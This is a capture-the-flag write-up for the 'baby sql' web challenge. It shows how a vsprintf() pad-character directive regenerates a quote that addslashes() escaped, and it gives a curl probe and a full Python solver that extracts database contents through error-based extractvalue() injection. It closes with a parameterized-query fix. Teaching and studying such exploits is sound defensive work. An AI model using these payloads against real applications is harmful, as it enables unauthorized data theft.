`addslashes()` looks like it makes user input safe for a SQL string. In this challenge it doesn't — because the query is run through `vsprintf()` a *second* time before it reaches the database, and that reformat pass regenerates the very quote `addslashes` escaped. The result is a full SQL injection ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) delivered through an uncontrolled format string ([CWE-134](https://cwe.mitre.org/data/definitions/134.html)).

## Overview

**baby sql** is a Medium Web challenge. The landing page helpfully prints its own PHP source. A login `pass` field is escaped with `addslashes()` and concatenated into a query — but the query object then re-processes the whole string with `vsprintf()`. A single `sprintf` format directive turns the escaped quote back into a live one, and since query results are never displayed, the flag comes out through an error-based `extractvalue()` channel.

## The technique

Here is the vulnerable code the page discloses:

```php
class db extends Connection {
    public function query($sql) {
        $args = func_get_args();
        unset($args[0]);
        return parent::query(vsprintf($sql, $args));   // second format pass
    }
}
$db = new db();
if (isset($_POST['pass'])) {
    $pass = addslashes($_POST['pass']);                // looks safe
    $db->query("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin');
}
```

`addslashes()` turns `'` into `\'` and `\` into `\\`. If the string went straight to MySQL, `password=('$pass')` would be safe. It doesn't: `db::query()` runs `vsprintf($sql, $args)` first, and `sprintf`/`vsprintf` re-interpret `%` sequences.

The key is sprintf's **custom padding character** syntax: `%<argnum>$'<char><conversion>` — the `'` declares that the *next* character is the pad character. Send `pass = %1$\'` and watch what survives:

1. `addslashes` escapes the `\` → `\\` and the `'` → `\'`, producing `%1$\\\'`.
2. That lands in the query as `password=('%1$\\\'')`.
3. `vsprintf` parses `%1$`, treats the following `\` as the **pad char** (consuming a backslash), and emits the trailing `'` **raw**.
4. The regenerated, unescaped `'` closes the string literal. The escaping is undone by the formatter itself.

A quick probe confirms the breakout:

```bash
curl -s http://<target>/ --data-urlencode "pass=%1\$\\'"
# You have an error in your SQL syntax; check the manual ... near 'admin')' at line 1
```

## Solution

The app runs the query but never echoes rows, so UNION output is invisible. Extract **error-based** instead — `extractvalue()` raises an XPATH error whose text contains the value. Two constraints shape the payloads:

- **No literal `%`** anywhere else — `vsprintf` eats it as a directive. Use hex string literals (`0x64625f6d343132` = `db_m412`) and `SUBSTRING`/`ASCII`, never `LIKE '%..%'`.
- `extractvalue` **truncates at ~32 chars** — page longer values with `SUBSTRING((expr),off,30)` and stitch.

The full solver enumerates the schema (names can differ per instance) and reads the flag:

```python
#!/usr/bin/env python3
import sys, re, requests

BASE = f"http://{sys.argv[1]}:{sys.argv[2]}/"
PREFIX = "%1$\\') UNION SELECT 1,"

def run(inner):
    payload = f"{PREFIX}extractvalue(0x0a,concat(0x0a,({inner})))#"
    r = requests.post(BASE, data={"pass": payload}, timeout=15)
    m = re.search(r"XPATH syntax error: '(.*)'", r.text, re.S)
    val = m.group(1)
    return val[1:] if val.startswith("\n") else val

def read_full(expr):
    out, off = "", 1
    while True:
        chunk = run(f"SELECT SUBSTRING(({expr}),{off},30)")
        if not chunk:
            break
        out += chunk
        if len(chunk) < 30:
            break
        off += 30
    return out

db = run("SELECT database()")
dbhex = "0x" + db.encode().hex()
tables = read_full(f"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema={dbhex}")
cols   = read_full(f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema={dbhex}")
flag_tbl = next((t for t in tables.split(",") if "flag" in t.lower()), tables.split(",")[0])
flag_col = "flag" if "flag" in cols.split(",") else cols.split(",")[0]
print(read_full(f"SELECT {flag_col} FROM {flag_tbl}"))
```

Running it walks the database out:

```
[+] database:  db_m412
[+] tables:    totally_not_a_flag,users
[+] columns:   flag,username,password
[+] FLAG: HTB{...}
```

## Why it worked

Escaping is not sanitization when another string-processing layer runs *after* the escape. `addslashes()` neutralised the quote, but the later `vsprintf()` pass re-interpreted `%` and pad-character syntax and rebuilt the quote from the backslash the escaping had added. The tell in any codebase: user input that is escaped and then handed to a formatter (`sprintf`/`vsprintf`/`printf`, or `preg_replace`) — the format layer can regenerate exactly the metacharacter the escaping removed.

## Fix / defense

Use parameterized queries — bind data, never build SQL by concatenation, escaped or not:

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE password = ? AND username = ?');
$stmt->execute([$_POST['pass'], 'admin']);
```

Binding keeps data and code separate, so no quantity of `%` or `'` in the input can change the query's structure. And never route already-escaped strings through `sprintf`/`vsprintf` — the second format pass is the whole vulnerability.
